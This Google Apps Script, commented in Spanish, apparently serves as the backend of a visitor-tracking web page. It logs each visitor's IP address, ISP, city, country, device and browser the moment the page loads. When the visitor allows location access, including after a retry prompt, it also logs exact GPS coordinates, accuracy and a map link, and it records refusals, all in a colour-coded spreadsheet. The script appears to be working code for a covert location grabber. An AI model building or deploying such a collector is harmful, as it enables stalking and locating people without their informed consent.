// ============================================
// SCRIPT PARA GOOGLE SHEETS
// Guarda todas las ubicaciones en una hoja de cálculo
// ============================================

/**
 * Función que recibe los datos vía POST
 */
function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    
    // Obtener la hoja activa (o crear si no existe)
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    
    // Si es la primera vez, crear encabezados
    if (sheet.getLastRow() === 0) {
      sheet.appendRow([
        'Fecha',
        'Hora',
        'Evento',
        'Session ID',
        'IP',
        'ISP',
        'Ciudad',
        'Región',
        'País',
        'Dispositivo',
        'Navegador',
        'Latitud',
        'Longitud',
        'Precisión (m)',
        'Link Mapa'
      ]);
      
      // Formatear encabezados
      var headerRange = sheet.getRange(1, 1, 1, 15);
      headerRange.setFontWeight('bold');
      headerRange.setBackground('#DC2626');
      headerRange.setFontColor('#FFFFFF');
    }
    
    var fecha = new Date();
    var fechaStr = Utilities.formatDate(fecha, 'America/Argentina/Buenos_Aires', 'dd/MM/yyyy');
    var horaStr = Utilities.formatDate(fecha, 'America/Argentina/Buenos_Aires', 'HH:mm:ss');
    
    var fila = [];
    
    if (data.event === 'page_load') {
      // Paquete 1: Solo IP/ISP
      fila = [
        fechaStr,
        horaStr,
        '🌐 Carga Página',
        data.sessionId || '',
        data.networkInfo?.ip || '',
        data.networkInfo?.isp || '',
        data.networkInfo?.city || '',
        data.networkInfo?.region || '',
        data.networkInfo?.country || '',
        data.deviceType || '',
        data.browserInfo?.userAgent?.substring(0, 50) || '',
        '', // Sin GPS aún
        '',
        '',
        ''
      ];
      
    } else if (data.event === 'gps_granted' || data.event === 'gps_granted_retry') {
      // Paquete 2: GPS aceptado
      var lat = data.gpsData?.latitude || 0;
      var lng = data.gpsData?.longitude || 0;
      var mapUrl = 'https://maps.google.com/?q=' + lat + ',' + lng;
      
      fila = [
        fechaStr,
        horaStr,
        '✅ GPS Aceptado',
        data.sessionId || '',
        data.networkInfo?.ip || '',
        data.networkInfo?.isp || '',
        data.networkInfo?.city || '',
        data.networkInfo?.region || '',
        data.networkInfo?.country || '',
        '', // Dispositivo ya registrado
        '',
        lat,
        lng,
        data.gpsData?.accuracy || '',
        mapUrl
      ];
      
      // Formatear fila en verde
      var lastRow = sheet.getLastRow() + 1;
      sheet.appendRow(fila);
      sheet.getRange(lastRow, 1, 1, 15).setBackground('#D1FAE5');
      return ContentService.createTextOutput('OK');
      
    } else if (data.event === 'gps_denied') {
      // GPS rechazado
      fila = [
        fechaStr,
        horaStr,
        '❌ GPS Rechazado',
        data.sessionId || '',
        '', '', '', '', '', '', '',
        '', '', '', ''
      ];
      
      var lastRow = sheet.getLastRow() + 1;
      sheet.appendRow(fila);
      sheet.getRange(lastRow, 1, 1, 15).setBackground('#FEE2E2');
      return ContentService.createTextOutput('OK');
    }
    
    // Agregar fila
    sheet.appendRow(fila);
    
    // Auto-ajustar columnas
    sheet.autoResizeColumns(1, 15);
    
    return ContentService.createTextOutput('OK');
    
  } catch (error) {
    Logger.log('Error: ' + error.toString());
    return ContentService.createTextOutput('ERROR: ' + error.toString());
  }
}

/**
 * Función para crear una nueva hoja limpia
 */
function crearNuevaHoja() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.insertSheet('Ubicaciones ' + new Date().toLocaleDateString());
  
  // Crear encabezados
  sheet.appendRow([
    'Fecha',
    'Hora',
    'Evento',
    'Session ID',
    'IP',
    'ISP',
    'Ciudad',
    'Región',
    'País',
    'Dispositivo',
    'Navegador',
    'Latitud',
    'Longitud',
    'Precisión (m)',
    'Link Mapa'
  ]);
  
  var headerRange = sheet.getRange(1, 1, 1, 15);
  headerRange.setFontWeight('bold');
  headerRange.setBackground('#DC2626');
  headerRange.setFontColor('#FFFFFF');
  sheet.autoResizeColumns(1, 15);
  
  Logger.log('Nueva hoja creada');
}
